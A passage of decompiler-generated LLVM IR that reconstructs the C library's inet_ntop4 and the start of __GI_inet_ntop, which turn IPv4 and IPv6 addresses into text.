  store i32 %v6_804d62b, i32* %edi.global-to-local, align 4
  %v2_804d62c = inttoptr i32 %v6_804d62b to i32*
  store i32 0, i32* %v2_804d62c, align 4
  %v3_804d62c = load i32, i32* %edi.global-to-local, align 4
  %v6_804d62c = add i32 %v3_804d62c, 4
  store i32 %v6_804d62c, i32* %edi.global-to-local, align 4
  %v0_804d62d = load i32, i32* %eax.global-to-local, align 4
  %v2_804d62d = inttoptr i32 %v6_804d62c to i32*
  store i32 %v0_804d62d, i32* %v2_804d62d, align 4
  %v3_804d62d = load i32, i32* %edi.global-to-local, align 4
  %v6_804d62d = add i32 %v3_804d62d, 4
  store i32 %v6_804d62d, i32* %edi.global-to-local, align 4
  %v0_804d62e = load i32, i32* %eax.global-to-local, align 4
  %v1_804d62e = trunc i32 %v0_804d62e to i16
  %v3_804d62e = inttoptr i32 %v6_804d62d to i16*
  store i16 %v1_804d62e, i16* %v3_804d62e, align 2
  %v4_804d62e = load i32, i32* %edi.global-to-local, align 4
  %v7_804d62e = add i32 %v4_804d62e, 2
  %v0_804d630 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d630 = trunc i32 %v0_804d630 to i8
  %v3_804d630 = inttoptr i32 %v7_804d62e to i8*
  store i8 %v1_804d630, i8* %v3_804d630, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_804d6cb30 = load i32, i32* @esi, align 4
  %v10_804d6cb33 = icmp eq i32 %v0_804d6cb30, 3
  store i1 %v10_804d6cb33, i1* %zf.global-to-local, align 1
  %v7_804d6ce35 = icmp sgt i32 %v0_804d6cb30, 3
  br i1 %v7_804d6ce35, label %dec_label_pc_804d6d4, label %dec_label_pc_804d638

dec_label_pc_804d638:                             ; preds = %dec_label_pc_804d6ab, %entry
  %v3_804d64e = phi i32 [ 0, %entry ], [ %v1_804d6d4.pre, %dec_label_pc_804d6ab ]
  %v0_804d6cb36 = phi i32 [ %v0_804d6cb30, %entry ], [ %v0_804d6cb, %dec_label_pc_804d6ab ]
  %v2_804d63e = add i32 %v0_804d6cb36, %v0_804d60d
  %v12_804d63e = icmp eq i32 %v2_804d63e, 0
  store i1 %v12_804d63e, i1* %zf.global-to-local, align 1
  store i32 %v2_804d63e, i32* %ebp.global-to-local, align 4
  %v1_804d640 = inttoptr i32 %v2_804d63e to i8*
  %v2_804d640 = load i8, i8* %v1_804d640, align 1
  %v3_804d640 = zext i8 %v2_804d640 to i32
  %v4_804d640 = load i32, i32* @edx, align 4
  %v5_804d640 = and i32 %v4_804d640, -65536
  %v6_804d640 = or i32 %v5_804d640, %v3_804d640
  store i32 %v6_804d640, i32* %edx.global-to-local, align 4
  %div8 = udiv i8 %v2_804d640, 100
  %v6_804d647 = zext i8 %div8 to i32
  %tmp24 = urem i8 %v2_804d640, 100
  %v12_804d647 = zext i8 %tmp24 to i32
  %v14_804d647 = mul nuw nsw i32 %v12_804d647, 256
  %v15_804d647 = or i32 %v6_804d647, %v5_804d640
  %v16_804d647 = or i32 %v15_804d647, %v14_804d647
  store i32 %v16_804d647, i32* %eax.global-to-local, align 4
  %v2_804d64b = or i8 %div8, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_804d64e = load i32, i32* @esp, align 4
  %v4_804d64e = add i32 %v2_804d64e, 43
  %v5_804d64e = add i32 %v4_804d64e, %v3_804d64e
  %v6_804d64e = inttoptr i32 %v5_804d64e to i8*
  store i8 %v2_804d64b, i8* %v6_804d64e, align 1
  %v0_804d652 = load i32, i32* %edi.global-to-local, align 4
  %v1_804d652 = add i32 %v0_804d652, 1
  store i32 %v0_804d652, i32* @ecx, align 4
  %v0_804d65b = load i32, i32* @esp, align 4
  %v2_804d65b = add i32 %v0_804d652, 43
  %v3_804d65b = add i32 %v2_804d65b, %v0_804d65b
  %v4_804d65b = inttoptr i32 %v3_804d65b to i8*
  %v5_804d65b = load i8, i8* %v4_804d65b, align 1
  %v11_804d65b = icmp eq i8 %v5_804d65b, 48
  store i1 %v11_804d65b, i1* %zf.global-to-local, align 1
  %v1_804d660 = icmp eq i1 %v11_804d65b, false
  %v0_804d68a = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_804d660, label %dec_label_pc_804d688, label %dec_label_pc_804d662

dec_label_pc_804d662:                             ; preds = %dec_label_pc_804d638
  %v3_804d666 = trunc i32 %v0_804d68a to i16
  %v5_804d666 = udiv i16 %v3_804d666, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_804d666, 256
  %tmp39 = urem i16 %tmp, 10
  %tmp25 = zext i16 %tmp39 to i32
  store i32 %tmp25, i32* %edx.global-to-local, align 4
  %v1_804d678 = trunc i16 %tmp39 to i8
  %v2_804d678 = or i8 %v1_804d678, 48
  %v12_804d678 = zext i8 %v2_804d678 to i32
  store i32 %v12_804d678, i32* %eax.global-to-local, align 4
  %v7_804d67a = icmp eq i8 %v1_804d678, 0
  store i1 %v7_804d67a, i1* %zf.global-to-local, align 1
  store i8 %v2_804d678, i8* %v4_804d65b, align 1
  %v0_804d680 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804d680, label %dec_label_pc_804d6ab, label %dec_label_pc_804d682

dec_label_pc_804d682:                             ; preds = %dec_label_pc_804d662
  store i32 %v1_804d652, i32* @ecx, align 4
  br label %dec_label_pc_804d6ab

dec_label_pc_804d688:                             ; preds = %dec_label_pc_804d638
  store i32 %v1_804d652, i32* %ebx.global-to-local, align 4
  %v3_804d690 = trunc i32 %v0_804d68a to i16
  %v5_804d690 = udiv i16 %v3_804d690, 10
  %tmp40 = urem i16 %v5_804d690, 256
  %tmp41 = urem i16 %tmp40, 10
  %tmp26 = zext i16 %tmp41 to i32
  store i32 %tmp26, i32* %edx.global-to-local, align 4
  %v1_804d6a0 = add i32 %v0_804d652, 2
  store i32 %v1_804d6a0, i32* @ecx, align 4
  %v1_804d6a5 = trunc i16 %tmp41 to i8
  %v2_804d6a5 = or i8 %v1_804d6a5, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_804d6a5 = zext i8 %v2_804d6a5 to i32
  store i32 %v12_804d6a5, i32* %eax.global-to-local, align 4
  %v4_804d6a7 = add i32 %v0_804d652, 44
  %v5_804d6a7 = add i32 %v4_804d6a7, %v0_804d65b
  %v6_804d6a7 = inttoptr i32 %v5_804d6a7 to i8*
  store i8 %v2_804d6a5, i8* %v6_804d6a7, align 1
  br label %dec_label_pc_804d6ab

dec_label_pc_804d6ab:                             ; preds = %dec_label_pc_804d662, %dec_label_pc_804d682, %dec_label_pc_804d688
  %v0_804d6ab = load i32, i32* %ebp.global-to-local, align 4
  %v1_804d6ab = inttoptr i32 %v0_804d6ab to i8*
  %v2_804d6ab = load i8, i8* %v1_804d6ab, align 1
  %v3_804d6ab = zext i8 %v2_804d6ab to i32
  store i32 %v3_804d6ab, i32* %eax.global-to-local, align 4
  %v0_804d6b4 = load i32, i32* @esi, align 4
  %v1_804d6b4 = add i32 %v0_804d6b4, 1
  store i32 %v1_804d6b4, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_804d6b9 = load i32, i32* @esp, align 4
  %v1_804d6b9 = load i32, i32* @ecx, align 4
  %v2_804d6b9 = add i32 %v0_804d6b9, 44
  %v3_804d6b9 = add i32 %v2_804d6b9, %v1_804d6b9
  %v4_804d6b9 = inttoptr i32 %v3_804d6b9 to i8*
  store i8 46, i8* %v4_804d6b9, align 1
  %v0_804d6be = load i32, i32* @ecx, align 4
  %v1_804d6be = add i32 %v0_804d6be, 2
  store i32 %v1_804d6be, i32* %edi.global-to-local, align 4
  %v0_804d6c1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d6c1 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d6c1 = zext i32 %v1_804d6c1 to i64
  %v3_804d6c1 = load i32, i32* %edx.global-to-local, align 4
  %v4_804d6c1 = zext i32 %v3_804d6c1 to i64
  %v5_804d6c1 = mul nuw i64 %v4_804d6c1, 4294967296
  %v6_804d6c1 = or i64 %v5_804d6c1, %v2_804d6c1
  %v7_804d6c1 = zext i32 %v0_804d6c1 to i64
  %v8_804d6c1 = udiv i64 %v6_804d6c1, %v7_804d6c1
  %v9_804d6c1 = trunc i64 %v8_804d6c1 to i32
  %v10_804d6c1 = urem i64 %v6_804d6c1, %v7_804d6c1
  %v11_804d6c1 = trunc i64 %v10_804d6c1 to i32
  store i32 %v11_804d6c1, i32* @edx, align 4
  %v3_804d6c3 = and i32 %v9_804d6c1, -256
  %v1_804d6c5 = trunc i64 %v10_804d6c1 to i8
  %v2_804d6c5 = add i8 %v1_804d6c5, 48
  %v12_804d6c5 = zext i8 %v2_804d6c5 to i32
  %v15_804d6c5 = or i32 %v12_804d6c5, %v3_804d6c3
  store i32 %v15_804d6c5, i32* %eax.global-to-local, align 4
  %v2_804d6c7 = load i32, i32* @esp, align 4
  %v4_804d6c7 = add i32 %v0_804d6be, 43
  %v5_804d6c7 = add i32 %v4_804d6c7, %v2_804d6c7
  %v6_804d6c7 = inttoptr i32 %v5_804d6c7 to i8*
  store i8 %v2_804d6c5, i8* %v6_804d6c7, align 1
  %v0_804d6cb = load i32, i32* @esi, align 4
  %v10_804d6cb = icmp eq i32 %v0_804d6cb, 3
  store i1 %v10_804d6cb, i1* %zf.global-to-local, align 1
  %v7_804d6ce = icmp sgt i32 %v0_804d6cb, 3
  %v1_804d6d4.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_804d6ce, label %dec_label_pc_804d6d4, label %dec_label_pc_804d638

dec_label_pc_804d6d4:                             ; preds = %dec_label_pc_804d6ab, %entry
  %v1_804d6d4 = phi i32 [ 0, %entry ], [ %v1_804d6d4.pre, %dec_label_pc_804d6ab ]
  %v0_804d6d4 = load i32, i32* @esp, align 4
  %v2_804d6d4 = add i32 %v0_804d6d4, 42
  %v3_804d6d4 = add i32 %v2_804d6d4, %v1_804d6d4
  %v4_804d6d4 = inttoptr i32 %v3_804d6d4 to i8*
  store i8 0, i8* %v4_804d6d4, align 1
  %v0_804d6d9 = load i32, i32* @esp, align 4
  %v9_804d6d9 = icmp eq i32 %v0_804d6d9, 12
  store i1 %v9_804d6d9, i1* %zf.global-to-local, align 1
  %tmp27 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp27, i8** %stack_var_-92, align 4
  %v3_804d6e1 = call i32 @strlen(i8* %tmp27)
  store i32 %v3_804d6e1, i32* @eax, align 4
  %v15_804d6e9 = icmp eq i32 %v3_804d6e1, %v0_804d620
  store i1 %v15_804d6e9, i1* %zf.global-to-local, align 1
  %tmp42 = icmp ugt i32 %v3_804d6e1, %v0_804d620
  br i1 %tmp42, label %dec_label_pc_804d6ef, label %dec_label_pc_804d6fe

dec_label_pc_804d6ef:                             ; preds = %dec_label_pc_804d6d4
  %v0_804d6ef = load i8*, i8** %stack_var_-92, align 4
  %v1_804d6ef = ptrtoint i8* %v0_804d6ef to i32
  %v2_804d6ef = call i32 @__errno_location(i32 %v1_804d6ef)
  %v1_804d6f4 = inttoptr i32 %v2_804d6ef to i32*
  store i32 28, i32* %v1_804d6f4, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804d70d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d70d

dec_label_pc_804d6fe:                             ; preds = %dec_label_pc_804d6d4
  %v2_804d6dc = ptrtoint i32* %stack_var_-33 to i32
  %tmp28 = bitcast i8** %stack_var_-56 to i32*
  %v3_804d7014 = load i32, i32* %tmp28, align 4
  %tmp29 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_804d7014, i32* %tmp29, align 4
  %v0_804d705.cast = inttoptr i32 %v3_804d7014 to i8*
  %v4_804d705 = call i32 @strcpy(i8* %v0_804d705.cast, i32 %v2_804d6dc)
  store i32 %v4_804d705, i32* %eax.global-to-local, align 4
  %v0_804d70a = load i32, i32* @esp, align 4
  %v6_804d70a = icmp eq i32 %v0_804d70a, -16
  store i1 %v6_804d70a, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804d70d

dec_label_pc_804d70d:                             ; preds = %dec_label_pc_804d6ef, %dec_label_pc_804d6fe
  %v0_804d714 = phi i32 [ 0, %dec_label_pc_804d6ef ], [ %v4_804d705, %dec_label_pc_804d6fe ]
  %v0_804d70d = phi i32 [ %v0_804d70d.pre, %dec_label_pc_804d6ef ], [ %v15_804d60a, %dec_label_pc_804d6fe ]
  %v9_804d70d = icmp eq i32 %v0_804d70d, -60
  store i1 %v9_804d70d, i1* %zf.global-to-local, align 1
  store i32 %v0_804d606, i32* @esi, align 4
  store i32 %v0_804d605, i32* @edi, align 4
  ret i32 %v0_804d714

; uselistorder directives
  uselistorder i32 %v0_804d6cb, { 2, 0, 1 }
  uselistorder i8 %v2_804d6a5, { 1, 0 }
  uselistorder i32 %v0_804d68a, { 1, 0 }
  uselistorder i1 %v11_804d65b, { 1, 0 }
  uselistorder i32 %v1_804d652, { 1, 0 }
  uselistorder i32 %v5_804d640, { 1, 0 }
  uselistorder i32 %v0_804d6cb30, { 1, 2, 0 }
  uselistorder i32* %stack_var_-33, { 2, 0, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i16 10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 43, { 2, 3, 4, 0, 1 }
  uselistorder i8 100, { 1, 2, 0 }
  uselistorder i1* @df, { 4, 10, 11, 0, 1, 12, 13, 18, 19, 7, 2, 3, 5, 6, 8, 9, 14, 15, 16, 17 }
  uselistorder label %dec_label_pc_804d70d, { 1, 0 }
  uselistorder label %dec_label_pc_804d6ab, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_804d716 = load i32, i32* @edi, align 4
  %v0_804d717 = load i32, i32* @esi, align 4
  %v0_804d718 = load i32, i32* @ebx, align 4
  %v15_804d719 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_804d720 = icmp eq i32 %arg1, 2
  br i1 %v9_804d720, label %dec_label_pc_804d730, label %dec_label_pc_804d725

dec_label_pc_804d725:                             ; preds = %entry
  %v9_804d725 = icmp eq i32 %arg1, 10
  %v1_804d728 = icmp eq i1 %v9_804d725, false
  br i1 %v1_804d728, label %dec_label_pc_804d8cf, label %dec_label_pc_804d748

dec_label_pc_804d730:                             ; preds = %entry
  %v4_804d730 = ptrtoint i8* %arg3 to i32
  store i32 %v4_804d730, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_804d73c = call i32 @inet_ntop4(i32 %v0_804d718, i32 %v0_804d717, i32 %v0_804d716)
  store i32 %v3_804d73c, i32* %eax.global-to-local, align 4
  store i32 %v3_804d73c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d8dc

dec_label_pc_804d748:                             ; preds = %dec_label_pc_804d725
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_804d74d = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804d74d, i32* %eax.global-to-local, align 4
  %tmp43 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp43, i8** %stack_var_-124, align 4
  %v6_804d752 = call i32 @__GI_memset(i8* %tmp43, i32 0, i32 32)
  store i32 %v6_804d752, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_804d774 = add i32 %arg2, 1
  br label %dec_label_pc_804d75e

dec_label_pc_804d75e:                             ; preds = %dec_label_pc_804d75e.dec_label_pc_804d75e_crit_edge, %dec_label_pc_804d748
  %v1_804d781 = phi i32 [ %v15_804d719, %dec_label_pc_804d748 ], [ %v1_804d781.pre, %dec_label_pc_804d75e.dec_label_pc_804d75e_crit_edge ]
  %v0_804d77966 = phi i32 [ 0, %dec_label_pc_804d748 ], [ %v0_804d785.pre, %dec_label_pc_804d75e.dec_label_pc_804d75e_crit_edge ]
  %v1_804d767 = ashr i32 %v0_804d77966, 31
  %v2_804d768 = zext i32 %v0_804d77966 to i64
  %v4_804d768 = zext i32 %v1_804d767 to i64
  %v5_804d768 = mul nuw i64 %v4_804d768, 4294967296
  %v6_804d768 = or i64 %v5_804d768, %v2_804d768
  %v8_804d768 = sdiv i64 %v6_804d768, 2
  %v9_804d768 = trunc i64 %v8_804d768 to i32
  store i32 %v9_804d768, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_804d768, i32* %ebx.global-to-local, align 4
  %v2_804d770 = add i32 %v0_804d77966, %arg2
  %v3_804d770 = inttoptr i32 %v2_804d770 to i8*
  %v4_804d770 = load i8, i8* %v3_804d770, align 1
  %v5_804d770 = zext i8 %v4_804d770 to i32
  store i32 %v5_804d770, i32* %eax.global-to-local, align 4
  %v3_804d774 = add i32 %v2_804d774, %v0_804d77966
  %v4_804d774 = inttoptr i32 %v3_804d774 to i8*
  %v5_804d774 = load i8, i8* %v4_804d774, align 1
  %v6_804d774 = zext i8 %v5_804d774 to i32
  store i32 %v6_804d774, i32* %edx.global-to-local, align 4
  %v1_804d779 = add i32 %v0_804d77966, 2
  store i32 %v1_804d779, i32* %ecx.global-to-local, align 4
  %v2_804d77c = mul nuw nsw i32 %v5_804d770, 256
  %v2_804d77f = or i32 %v6_804d774, %v2_804d77c
  store i32 %v2_804d77f, i32* %eax.global-to-local, align 4
  %v3_804d781 = mul i32 %v9_804d768, 4
  %v4_804d781 = add i32 %v3_804d781, 60
  %v5_804d781 = add i32 %v4_804d781, %v1_804d781
  %v6_804d781 = inttoptr i32 %v5_804d781 to i32*
  store i32 %v2_804d77f, i32* %v6_804d781, align 4
  %v0_804d785.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_804d788 = icmp sgt i32 %v0_804d785.pre, 15
  br i1 %v7_804d788, label %dec_label_pc_804d78a, label %dec_label_pc_804d75e.dec_label_pc_804d75e_crit_edge

dec_label_pc_804d75e.dec_label_pc_804d75e_crit_edge: ; preds = %dec_label_pc_804d75e
  %v1_804d781.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d75e

dec_label_pc_804d78a:                             ; preds = %dec_label_pc_804d75e
  %v4_804d748 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804d794.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d794

dec_label_pc_804d794:                             ; preds = %dec_label_pc_804d78a, %dec_label_pc_804d7c1
  %v0_804d7c165 = phi i32 [ 0, %dec_label_pc_804d78a ], [ %v1_804d7c1, %dec_label_pc_804d7c1 ]
  %v0_804d7ac64 = phi i32 [ -1, %dec_label_pc_804d78a ], [ %v0_804d7ac8, %dec_label_pc_804d7c1 ]
  %v0_804d7cc63 = phi i32 [ -1, %dec_label_pc_804d78a ], [ %v0_804d7b19, %dec_label_pc_804d7c1 ]
  %v0_804d7d762 = phi i32 [ -1, %dec_label_pc_804d78a ], [ %v0_804d7bc13, %dec_label_pc_804d7c1 ]
  %v2_804d794 = mul nuw nsw i32 %v0_804d7c165, 4
  %v3_804d794 = add nuw nsw i32 %v2_804d794, 60
  %v4_804d794 = add i32 %v3_804d794, %v0_804d794.pre
  %v5_804d794 = inttoptr i32 %v4_804d794 to i32*
  %v6_804d794 = load i32, i32* %v5_804d794, align 4
  %v7_804d794 = icmp eq i32 %v6_804d794, 0
  %v1_804d799 = icmp eq i1 %v7_804d794, false
  %v10_804d7ac = icmp eq i32 %v0_804d7ac64, -1
  br i1 %v1_804d799, label %dec_label_pc_804d7ac, label %dec_label_pc_804d79b

dec_label_pc_804d79b:                             ; preds = %dec_label_pc_804d794
  %v1_804d79e = icmp eq i1 %v10_804d7ac, false
  br i1 %v1_804d79e, label %dec_label_pc_804d7a9, label %dec_label_pc_804d7a0

dec_label_pc_804d7a0:                             ; preds = %dec_label_pc_804d79b
  store i32 %v0_804d7c165, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d7c1

dec_label_pc_804d7a9:                             ; preds = %dec_label_pc_804d79b
  %v0_804d7a9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d7a9 = add i32 %v0_804d7a9, 1
  store i32 %v1_804d7a9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d7c1

dec_label_pc_804d7ac:                             ; preds = %dec_label_pc_804d794
  br i1 %v10_804d7ac, label %dec_label_pc_804d7c1, label %dec_label_pc_804d7b1

dec_label_pc_804d7b1:                             ; preds = %dec_label_pc_804d7ac
  %v10_804d7b1 = icmp eq i32 %v0_804d7cc63, -1
  %v0_804d7ba.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d7b6 = load i32, i32* @ebp, align 4
  %v7_804d7b8 = icmp sgt i32 %v0_804d7ba.pre, %v1_804d7b6
  %or.cond = or i1 %v10_804d7b1, %v7_804d7b8
  br i1 %or.cond, label %dec_label_pc_804d7ba, label %dec_label_pc_804d7be

dec_label_pc_804d7ba:                             ; preds = %dec_label_pc_804d7b1
  store i32 %v0_804d7ba.pre, i32* @ebp, align 4
  store i32 %v0_804d7d762, i32* @edi, align 4
  br label %dec_label_pc_804d7be

dec_label_pc_804d7be:                             ; preds = %dec_label_pc_804d7b1, %dec_label_pc_804d7ba
  %v0_804d7b111 = phi i32 [ %v0_804d7d762, %dec_label_pc_804d7ba ], [ %v0_804d7cc63, %dec_label_pc_804d7b1 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d7c1

dec_label_pc_804d7c1:                             ; preds = %dec_label_pc_804d7ac, %dec_label_pc_804d7a9, %dec_label_pc_804d7a0, %dec_label_pc_804d7be
  %v0_804d7bc13 = phi i32 [ %v0_804d7d762, %dec_label_pc_804d7ac ], [ %v0_804d7d762, %dec_label_pc_804d7a9 ], [ %v0_804d7c165, %dec_label_pc_804d7a0 ], [ -1, %dec_label_pc_804d7be ]
  %v0_804d7ac8 = phi i32 [ -1, %dec_label_pc_804d7ac ], [ %v0_804d7ac64, %dec_label_pc_804d7a9 ], [ %v0_804d7c165, %dec_label_pc_804d7a0 ], [ -1, %dec_label_pc_804d7be ]
  %v0_804d7b19 = phi i32 [ %v0_804d7cc63, %dec_label_pc_804d7ac ], [ %v0_804d7cc63, %dec_label_pc_804d7a9 ], [ %v0_804d7cc63, %dec_label_pc_804d7a0 ], [ %v0_804d7b111, %dec_label_pc_804d7be ]
  %v1_804d7c1 = add nuw nsw i32 %v0_804d7c165, 1
  store i32 %v1_804d7c1, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_804d7c1, 8
  br i1 %exitcond, label %dec_label_pc_804d7c7, label %dec_label_pc_804d794

dec_label_pc_804d7c7:                             ; preds = %dec_label_pc_804d7c1
  %v10_804d7c7 = icmp eq i32 %v0_804d7bc13, -1
  br i1 %v10_804d7c7, label %dec_label_pc_804d7d9, label %dec_label_pc_804d7cc

dec_label_pc_804d7cc:                             ; preds = %dec_label_pc_804d7c7
  %v10_804d7cc = icmp eq i32 %v0_804d7b19, -1
  %v0_804d7d5.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_804d7cc, label %dec_label_pc_804d7d5, label %dec_label_pc_804d7d1

dec_label_pc_804d7d1:                             ; preds = %dec_label_pc_804d7cc
  %v1_804d7d1 = load i32, i32* @ebp, align 4
  %v7_804d7d3 = icmp sgt i32 %v0_804d7d5.pre, %v1_804d7d1
  br i1 %v7_804d7d3, label %dec_label_pc_804d7d5, label %dec_label_pc_804d7d9

dec_label_pc_804d7d5:                             ; preds = %dec_label_pc_804d7cc, %dec_label_pc_804d7d1
  store i32 %v0_804d7d5.pre, i32* @ebp, align 4
  store i32 %v0_804d7bc13, i32* @edi, align 4
  br label %dec_label_pc_804d7d9

dec_label_pc_804d7d9:                             ; preds = %dec_label_pc_804d7d1, %dec_label_pc_804d7c7, %dec_label_pc_804d7d5
  %v5_804d7e6 = phi i32 [ %v0_804d7b19, %dec_label_pc_804d7d1 ], [ %v0_804d7b19, %dec_label_pc_804d7c7 ], [ %v0_804d7bc13, %dec_label_pc_804d7d5 ]
  %v10_804d7d9 = icmp eq i32 %v5_804d7e6, -1
  br i1 %v10_804d7d9, label %dec_label_pc_804d7e9, label %dec_label_pc_804d7de

dec_label_pc_804d7de:                             ; preds = %dec_label_pc_804d7d9
  %v0_804d7de = load i32, i32* @ebp, align 4
  %v1_804d7de = add i32 %v0_804d7de, -1
  %v6_804d7de = sub i32 0, %v0_804d7de
  %v7_804d7de = and i32 %v0_804d7de, %v6_804d7de
  %v8_804d7de = icmp slt i32 %v7_804d7de, 0
  %v9_804d7de = icmp eq i32 %v1_804d7de, 0
  %v10_804d7de = icmp slt i32 %v1_804d7de, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_804d7e6 = icmp ne i1 %v10_804d7de, %v8_804d7de
  %v4_804d7e6 = or i1 %v9_804d7de, %v3_804d7e6
  %v7_804d7e6 = select i1 %v4_804d7e6, i32 -1, i32 %v5_804d7e6
  store i32 %v7_804d7e6, i32* @edi, align 4
  br label %dec_label_pc_804d7e9

dec_label_pc_804d7e9:                             ; preds = %dec_label_pc_804d7d9, %dec_label_pc_804d7de
  %v0_804d88918 = phi i32 [ %v5_804d7e6, %dec_label_pc_804d7d9 ], [ %v7_804d7e6, %dec_label_pc_804d7de ]
  %v2_804d7e9 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_804d7e9, i32* @ebx, align 4
  %v3_804d86b = add i32 %v4_804d748, 64
  %v12_804d829 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_804d88954 = icmp eq i32 %v0_804d88918, -1
  %v1_804d831 = icmp eq i1 %v12_804d829, false
  br label %dec_label_pc_804d7f4

dec_label_pc_804d7f4:                             ; preds = %dec_label_pc_804d7e9, %dec_label_pc_804d87f
  %v10_804d88961 = phi i1 [ %v10_804d88954, %dec_label_pc_804d7e9 ], [ %v10_804d889, %dec_label_pc_804d87f ]
  %v0_804d80e60 = phi i32 [ 0, %dec_label_pc_804d7e9 ], [ %v1_804d87f, %dec_label_pc_804d87f ]
  %v1_804d80459 = phi i32 [ %v0_804d88918, %dec_label_pc_804d7e9 ], [ %v0_804d889.pre, %dec_label_pc_804d87f ]
  %v0_804d81258 = phi i32 [ %v2_804d7e9, %dec_label_pc_804d7e9 ], [ %v0_804d80819, %dec_label_pc_804d87f ]
  %stack_var_-120.157 = phi i8* [ null, %dec_label_pc_804d7e9 ], [ %stack_var_-120.0, %dec_label_pc_804d87f ]
  %stack_var_-116.156 = phi i32 [ 32, %dec_label_pc_804d7e9 ], [ %stack_var_-116.0, %dec_label_pc_804d87f ]
  br i1 %v10_804d88961, label %dec_label_pc_804d80e, label %dec_label_pc_804d7f9

dec_label_pc_804d7f9:                             ; preds = %dec_label_pc_804d7f4
  %v2_804d7f9 = sub i32 %v0_804d80e60, %v1_804d80459
  %v8_804d7f9 = xor i32 %v0_804d80e60, %v1_804d80459
  %v9_804d7f9 = xor i32 %v2_804d7f9, %v0_804d80e60
  %v10_804d7f9 = and i32 %v9_804d7f9, %v8_804d7f9
  %v11_804d7f9 = icmp slt i32 %v10_804d7f9, 0
  %v12_804d7f9 = icmp eq i32 %v2_804d7f9, 0
  %v13_804d7f9 = icmp slt i32 %v2_804d7f9, 0
  %v2_804d7fb = icmp eq i1 %v13_804d7f9, %v11_804d7f9
  br i1 %v2_804d7fb, label %dec_label_pc_804d7fd, label %dec_label_pc_804d80e

dec_label_pc_804d7fd:                             ; preds = %dec_label_pc_804d7f9
  %v1_804d7fd = load i32, i32* @ebp, align 4
  %v2_804d7fd = add i32 %v1_804d7fd, %v1_804d80459
  store i32 %v2_804d7fd, i32* %eax.global-to-local, align 4
  %v2_804d800 = sub i32 %v0_804d80e60, %v2_804d7fd
  %v8_804d800 = xor i32 %v2_804d7fd, %v0_804d80e60
  %v9_804d800 = xor i32 %v2_804d800, %v0_804d80e60
  %v10_804d800 = and i32 %v9_804d800, %v8_804d800
  %v11_804d800 = icmp slt i32 %v10_804d800, 0
  %v13_804d800 = icmp slt i32 %v2_804d800, 0
  %v2_804d802 = icmp eq i1 %v13_804d800, %v11_804d800
  br i1 %v2_804d802, label %dec_label_pc_804d80e, label %dec_label_pc_804d804

dec_label_pc_804d804:                             ; preds = %dec_label_pc_804d7fd
  %v1_804d806 = icmp eq i1 %v12_804d7f9, false
  br i1 %v1_804d806, label %dec_label_pc_804d87f, label %dec_label_pc_804d808

dec_label_pc_804d808:                             ; preds = %dec_label_pc_804d804
  %v1_804d808 = inttoptr i32 %v0_804d81258 to i8*
  store i8 58, i8* %v1_804d808, align 1
  %v0_804d80b = load i32, i32* @ebx, align 4
  %v1_804d80b = add i32 %v0_804d80b, 1
